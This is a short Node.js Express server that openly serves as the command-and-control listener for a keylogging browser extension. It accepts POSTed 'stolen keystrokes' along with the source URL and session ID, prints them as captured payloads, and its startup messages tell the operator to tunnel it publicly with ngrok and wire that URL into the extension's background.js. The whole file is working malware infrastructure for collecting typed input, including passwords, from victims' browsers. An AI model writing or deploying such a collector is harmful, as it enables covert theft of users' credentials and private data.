const express = require("express");
const cors = require("cors");
const app = express();
// Middleware
app.use(cors()); // Important: allows the browser extension to send fetches cross-origin
app.use(express.json()); // Parses the incoming webhook JSON body
// Webhook endpoint to catch the stolen keystrokes
app.post("/api/collect", (req, res) => {
  console.log("\n=======================================================");
  console.log(" [C2 SERVER] NEW DATA PAYLOAD RECEIVED ");
  console.log("=======================================================");
  const data = req.body;
  if (!data.url) {
    console.warn("Received malformed payload without URL.", data);
    return res.status(400).json({ status: "error" });
  }
  console.log(` SOURCE:     ${data.url}`);
  console.log(` TIMESTAMP:  ${new Date(data.timestamp).toLocaleString()}`);
  console.log(` SESSION ID: ${data.sessionId}`);
  console.log(` OBFUSCATED: ${data.obfuscated ? "Yes" : "No"}`);
  console.log("\n --- RAW KEYSTROKES ---");
  console.log(data.keys);
  console.log("-------------------------\n");
  // Standard attacker webhook response
  res.status(200).json({ status: "logged" });
});
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`\n C2 Listener is online and running on port ${PORT}`);
  console.log(
    `\n Next step: Run 'ngrok http ${PORT}' in a separate terminal to create your public tunnel.`,
  );
  console.log(`Then, paste the ngrok URL into background.js (SERVER_URL).\n`);
});
